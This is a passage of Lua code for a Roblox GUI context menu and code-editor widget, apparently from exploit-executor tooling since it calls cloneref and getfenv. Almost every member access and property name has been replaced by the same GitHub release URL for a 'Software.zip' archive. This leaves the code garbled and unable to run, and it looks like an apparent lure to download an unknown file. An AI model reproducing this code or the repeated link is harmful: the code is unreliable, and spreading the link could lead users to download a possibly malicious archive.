			if x + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > maxX then
				x = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and x - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or maxX - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,x,0,y)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

			-- Size adjustment
			local toSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 6 -- Padding
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and toSize > https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,toSize-6)
				toSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0)
			end
			if y + toSize > maxY then reverseY = true end

			-- Close event
			local closable
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if not closable or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					self:Hide()
				end
			end)

			-- Resize
			if reverseY then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,x,0,y-(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0))
				local newY = y - toSize - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0)
				y = newY >= 0 and newY or 0
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,toSize),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,x,0,y),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.2,true)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,toSize),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.2,true)
			end

			-- Close debounce
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
			closable = true
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,data)
			local theme = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		local mt = {__index = funcs}
		local function new()
			if not mouse then mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end

			local obj = setmetatable({
				Width = 200,
				MaxHeight = nil,
				Iconless = false,
				SearchEnabled = false,
				ClearSearchOnShow = true,
				FocusSearchOnShow = true,
				Updated = false,
				QueuedDivider = false,
				QueuedDividerText = "",
				Items = {},
				Registered = {},
				GuiElems = {},
				Theme = {}
			},mt)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = createGui(obj)
			obj:ApplyTheme({})
			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}

		local typeMap = {
			[1] = "String",
			[2] = "String",
			[3] = "String",
			[4] = "Comment",
			[5] = "Operator",
			[6] = "Number",
			[7] = "Keyword",
			[8] = "BuiltIn",
			[9] = "LocalMethod",
			[10] = "LocalProperty",
			[11] = "Nil",
			[12] = "Bool",
			[13] = "Function",
			[14] = "Local",
			[15] = "Self",
			[16] = "FunctionName",
			[17] = "Bracket"
		}

		local specialKeywordsTypes = {
			["nil"] = 11,
			["true"] = 12,
			["false"] = 12,
			["function"] = 13,
			["local"] = 14,
			["self"] = 15
		}

		local keywords = {
			["and"] = true,
			["break"] = true, 
			["do"] = true,
			["else"] = true,
			["elseif"] = true,
			["end"] = true,
			["false"] = true,
			["for"] = true,
			["function"] = true,
			["if"] = true,
			["in"] = true,
			["local"] = true,
			["nil"] = true,
			["not"] = true,
			["or"] = true,
			["repeat"] = true,
			["return"] = true,
			["then"] = true,
			["true"] = true,
			["until"] = true,
			["while"] = true,
			["plugin"] = true
		}

		local builtIns = {
			["delay"] = true,
			["elapsedTime"] = true,
			["require"] = true,
			["spawn"] = true,
			["tick"] = true,
			["time"] = true,
			["typeof"] = true,
			["UserSettings"] = true,
			["wait"] = true,
			["warn"] = true,
			["game"] = true,
			["shared"] = true,
			["script"] = true,
			["workspace"] = true,
			["assert"] = true,
			["collectgarbage"] = true,
			["error"] = true,
			["getfenv"] = true,
			["getmetatable"] = true,
			["ipairs"] = true,
			["loadstring"] = true,
			["newproxy"] = true,
			["next"] = true,
			["pairs"] = true,
			["pcall"] = true,
			["print"] = true,
			["rawequal"] = true,
			["rawget"] = true,
			["rawset"] = true,
			["select"] = true,
			["setfenv"] = true,
			["setmetatable"] = true,
			["tonumber"] = true,
			["tostring"] = true,
			["type"] = true,
			["unpack"] = true,
			["xpcall"] = true,
			["_G"] = true,
			["_VERSION"] = true,
			["coroutine"] = true,
			["debug"] = true,
			["math"] = true,
			["os"] = true,
			["string"] = true,
			["table"] = true,
			["bit32"] = true,
			["utf8"] = true,
			["Axes"] = true,
			["BrickColor"] = true,
			["CFrame"] = true,
			["Color3"] = true,
			["ColorSequence"] = true,
			["ColorSequenceKeypoint"] = true,
			["DockWidgetPluginGuiInfo"] = true,
			["Enum"] = true,
			["Faces"] = true,
			["Instance"] = true,
			["NumberRange"] = true,
			["NumberSequence"] = true,
			["NumberSequenceKeypoint"] = true,
			["PathWaypoint"] = true,
			["PhysicalProperties"] = true,
			["Random"] = true,
			["Ray"] = true,
			["Rect"] = true,
			["Region3"] = true,
			["Region3int16"] = true,
			["TweenInfo"] = true,
			["UDim"] = true,
			["UDim2"] = true,
			["Vector2"] = true,
			["Vector2int16"] = true,
			["Vector3"] = true,
			["Vector3int16"] = true
		}

		local builtInInited = false

		local richReplace = {
			["'"] = "&apos;",
			["\""] = "&quot;",
			["<"] = "&lt;",
			[">"] = "&gt;",
			["&"] = "&amp;"
		}
		
		local tabSub = "\205"
		local tabReplacement = (" %s%s "):format(tabSub,tabSub)
		
		local tabJumps = {
			[("[^%s] %s"):format(tabSub,tabSub)] = 0,
			[(" %s%s"):format(tabSub,tabSub)] = -1,
			[("%s%s "):format(tabSub,tabSub)] = 2,
			[("%s [^%s]"):format(tabSub,tabSub)] = 1,
		}
		
		local tweenService = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local lineTweens = {}

		local function initBuiltIn()
			local env = getfenv()
			local type = type
			local tostring = tostring
			for name,_ in next,builtIns do
				local envVal = env[name]
				if type(envVal) == "table" then
					local items = {}
					for i,v in next,envVal do
						items[i] = true
					end
					builtIns[name] = items
				end
			end

			local enumEntries = {}
			local enums = Enum:GetEnums()
			for i = 1,#enums do
				enumEntries[tostring(enums[i])] = true
			end
			builtIns["Enum"] = enumEntries

			builtInInited = true
		end
		
		local function setupEditBox(obj)
			local editBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				obj:ConnectEditBoxEvent()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			end)
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				obj:DisconnectEditBoxEvent()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end)
			
			editBox:GetPropertyChangedSignal("Text"):Connect(function()
				local text = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				if #text == 0 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ""
				obj:AppendText(text)
			end)
		end
		
		local function setupMouseSelection(obj)
			local mouse = plr:GetMouse()
			local codeFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local lines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local fontSizeX,fontSizeY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					
					local relX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local relY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local selX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relX / fontSizeX) + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local selY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relY / fontSizeY) + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local releaseEvent,mouseEvent,scrollEvent
					local scrollPowerV,scrollPowerH = 0,0
					selY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(#lines-1,selY)
					local relativeLine = lines[selY+1] or ""
					selX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(#relativeLine, selX + obj:TabAdjust(selX,selY))

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {{-1,-1},{-1,-1}}
					obj:MoveCursor(selX,selY)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = selX

					local function updateSelection()
						local relX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local relY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local sel2X = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relX / fontSizeX) + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
						local sel2Y = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(relY / fontSizeY) + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

						sel2Y = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(#lines-1,sel2Y)
						local relativeLine = lines[sel2Y+1] or ""
						sel2X = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(#relativeLine, sel2X + obj:TabAdjust(sel2X,sel2Y))

						if sel2Y < selY or (sel2Y == selY and sel2X < selX) then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {{sel2X,sel2Y},{selX,selY}}
						else						
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {{selX,selY},{sel2X,sel2Y}}
						end

						obj:MoveCursor(sel2X,sel2Y)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sel2X
						obj:Refresh()
					end

					releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							releaseEvent:Disconnect()
							mouseEvent:Disconnect()
							scrollEvent:Disconnect()
							obj:SetCopyableSelection()
							--updateSelection()
						end
					end)

					mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							local upDelta = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local downDelta = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local leftDelta = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local rightDelta = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							scrollPowerV = 0
							scrollPowerH = 0
							if downDelta > 0 then
								scrollPowerV = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(downDelta*0.05) + 1
							elseif upDelta < 0 then
								scrollPowerV = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(upDelta*0.05) - 1
							end
							if rightDelta > 0 then
								scrollPowerH = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(rightDelta*0.05) + 1
							elseif leftDelta < 0 then
								scrollPowerH = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(leftDelta*0.05) - 1
							end
							updateSelection()
						end
					end)

					scrollEvent = cloneref(game["Run Service"].Parent:GetService("RunService")).RenderStepped:Connect(function()
						if scrollPowerV ~= 0 or scrollPowerH ~= 0 then
							obj:ScrollDelta(scrollPowerH,scrollPowerV)
							updateSelection()
						end
					end)

					obj:Refresh()
				end
			end)
		end

		local function makeFrame(obj)
			local frame = create({
				{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel = 0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,-300,0.5,-200),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,600,0,400),}},
			})
			local elems = {}
			
			local linesFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Lines"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			
			local lineNumbersLabel = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextLabel")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "LineNumbers"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			
			local cursor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Frame")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Cursor"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(220,220,220)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			
			local editBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextBox")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "EditBox"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tweenService:Create(cursor,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.4,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),{BackgroundTransparency = 1})
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tweenService:Create(cursor,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),{BackgroundTransparency = 0})
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = linesFrame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = lineNumbersLabel
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = cursor
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = editBox
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = create({{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="ScrollCorner",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,1,-16),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),Visible=false,}}})
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					obj:SetEditing(true,input)
				end
			end)
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = frame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = elems
			setupEditBox(obj)
			setupMouseSelection(obj)
			
			return frame
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			if not self:IsValidRange() then return "" end
			
			local selectionRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local selX,selY = selectionRange[1][1], selectionRange[1][2]
			local sel2X,sel2Y = selectionRange[2][1], selectionRange[2][2]
			local deltaLines = sel2Y-selY
			local lines = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if not lines[selY+1] or not lines[sel2Y+1] then return "" end

			if deltaLines == 0 then
				return self:ConvertText(lines[selY+1]:sub(selX+1,sel2X), false)
			end

			local leftSub = lines[selY+1]:sub(selX+1)
			local rightSub = lines[sel2Y+1]:sub(1,sel2X)

			local result = leftSub.."\n" 
			for i = selY+1,sel2Y-1 do
				result = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[i+1].."\n"
			end
			result = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			return self:ConvertText(result,false)
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local text = self:GetSelectionText()
			local editBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = text
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		end
		
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
			
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
				
				local keycodes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local keycode = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				
				local function setupMove(key,func)
					local endCon,finished
					endCon = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= key then return end
						endCon:Disconnect()
						finished = true
					end)
					func()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5)
					while not finished do func() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.03) end
				end
				
				if keycode == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					setupMove(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,function()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
						self:UpdateCursor()
						self:JumpToCursor()
					end)
				elseif keycode == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					setupMove(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,function()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1
						self:UpdateCursor()
						self:JumpToCursor()
					end)
				elseif keycode == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					setupMove(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,function()
						local line = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] or ""
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1 - (line:sub(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) == tabReplacement and 3 or 0)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < 0 then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1
							local line2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] or ""
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = #line2
						end
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						self:UpdateCursor()
						self:JumpToCursor()
					end)
				elseif keycode == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					setupMove(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,function()
						local line = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] or ""
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1 + (line:sub(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+4) == tabReplacement and 3 or 0)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > #line then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
						end
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						self:UpdateCursor()
						self:JumpToCursor()
					end)
				elseif keycode == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					setupMove(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,function()
						local startRange,endRange
						if self:IsValidRange() then
							startRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1]
							endRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[2]
						else
							endRange = {https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip}
						end
						
						if not startRange then
							local line = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] or ""
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1 - (line:sub(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) == tabReplacement and 3 or 0)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < 0 then
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1
								local line2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] or ""
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = #line2
							end
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							self:UpdateCursor()
						
							startRange = startRange or {https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip}
						end
						
						self:DeleteRange({startRange,endRange},false,true)
						self:ResetSelection(true)
						self:JumpToCursor()
					end)
				elseif keycode == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					setupMove(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,function()
						local startRange,endRange
						if self:IsValidRange() then
							startRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1]
							endRange = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[2]
						else
							startRange = {https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip}
						end

						if not endRange then
							local line = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] or ""
							local endCursorX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1 + (line:sub(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+4) == tabReplacement and 3 or 0)
							local endCursorY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
